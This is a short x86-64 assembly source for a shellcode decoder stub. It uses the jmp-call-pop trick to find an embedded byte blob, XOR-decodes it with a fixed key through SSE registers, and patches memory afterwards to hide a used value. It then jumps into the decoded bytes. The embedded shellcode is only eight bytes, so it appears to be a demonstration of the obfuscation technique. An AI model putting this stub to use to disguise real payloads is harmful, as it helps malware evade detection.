BITS 64

global _start

section .text

_start:
        jmp _load_shellcode
_real_start:
        pop r15         ; r15 hold the address of shellcode
        xor rax, rax
        mov rcx, rax
        mov r14, rcx
        add r14, 4
        add cl, 2
        mov eax, 0x06b08be6
        mov rbx, r15
        sub bl, 4

_loop:
        xor rdx, rdx
        movd xmm0, DWORD [rbx + rcx * 4]
        movd xmm1, eax
        xorps xmm0, xmm1
        movd edx, xmm0

        mov DWORD [rbx + rcx * 4], edx

        loop _loop
        mov DWORD [r15 - 50], 0x11223344        ; example of patching your code to hide the real value after it was used
        jmp r15



_load_shellcode:
        call _real_start
shellcode: db 0x2a,0x47,0x7c,0xca,0x2a,0x47,0x7c,0xca
